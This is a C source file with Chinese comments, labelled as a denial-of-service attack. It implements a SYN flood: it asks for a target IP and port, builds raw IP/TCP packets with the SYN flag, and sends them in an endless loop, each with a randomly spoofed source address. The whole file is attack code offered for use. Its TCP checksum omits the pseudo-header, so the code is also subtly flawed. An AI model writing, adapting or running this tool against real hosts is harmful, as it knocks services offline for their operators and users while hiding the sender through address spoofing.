#include <errno.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

//拒绝服务攻击 dos
void send_data(int sfd,struct sockaddr_in *addr ,int port);

int main(int argc, char *argv[]){
	char ip[32];//目标ip
	int dport;//目标端口
	int sport;//源端口
	int sfd;
	struct sockaddr_in addr;

	memset(&addr,0x00,sizeof(struct sockaddr_in));//清空addr
	printf("目标IP: ");scanf("%s",ip);
	printf("目标端口： ");scanf("%d",&dport);
	printf("源端口： ");scanf("%d",&sport);

	addr.sin_family=AF_INET;
	inet_aton(ip,&addr.sin_addr);
	addr.sin_port=htons(dport);//端口
	if((sfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP))== -1){
		perror("socket");
		exit(EXIT_FAILURE);
	}
	int on= 1;
	setsockopt(sfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on));//tcp之中原本没有ip头部，我们需要获取ip头部，
	send_data(sfd,&addr,sport);//发送
}

u_short checksum(u_short *data ,int len){//检验和计算
	u_long sum=0;

	for(;len>1;len-=2){
		sum += *data++;
		if ( sum & 0x80000000 ) {
			sum = (sum&0xffff) + (sum>>16);
		}
	}

	if ( len == 1 ) { // 最后剩下一个
		u_short i = 0;
		*(u_char*)&i = *(u_char*)data;
		sum += i;
	}
	while ( sum >> 16 ){ // 高16位如果有1，继续计算
		sum = (sum&0xffff) + (sum>>16);
	}
	return (sum == 0xffff) ? sum : ~sum;
}


void send_data(int sfd,struct sockaddr_in *addr, int port){
	char buf[100];//组包得空间
	struct iphdr *ip;//ip头部
	struct tcphdr *tcp;//tcp头部
	int head_len;//头部长度

	head_len =sizeof(struct iphdr)+sizeof(struct tcphdr);//ip头+tcp头
	memset(buf,0x00,sizeof(buf));


	ip=(struct iphdr*)buf;//组装ip
	ip->version=IPVERSION;//ipv4
	ip->ihl = sizeof(struct ip)>>2;//首部长度，取得时候左移两位，装的时候就需要右移两位
	ip->tos = 0;                //服务类型不要 写0 
	ip->tot_len = htons(head_len);//总长度 数据为空，就是tcp和ip头部的大小 ，需要装网络字节序
	ip->id = 0;//包的编号 现在无用
	ip->frag_off = 0;//标识位：也用不到
	ip->ttl = MAXTTL;//生存时间 写最大时间就行            
	ip->protocol = IPPROTO_TCP;  //上层协议 tcp
	ip->check = 0;              //检验和先清空
	ip->daddr = addr->sin_addr.s_addr; //目标地址 在addr中


	tcp = (struct tcphdr*)(buf+sizeof(struct iphdr));//组装tcp
	tcp->source = htons(port);//tcp的源端口
	tcp->dest = addr->sin_port; //目标端口
	tcp->seq = random();//随机产生的序列号
	tcp->ack_seq = 0;//应答报文对我们没用 填0
	tcp->doff = 5;//放5
	tcp->syn = 1;//放1 发包

	while(1){
		ip->saddr=random();//产生随机源ip
		tcp->check=checksum((u_short*)(buf+sizeof(struct iphdr)),sizeof(struct tcphdr));//tcp校验和计算
		sendto(sfd,buf,head_len,0,(struct sockaddr*)addr,(socklen_t)sizeof(struct sockaddr_in));//套接字，数据，数据的长度，0， 目标位置，目标长度
	}
}
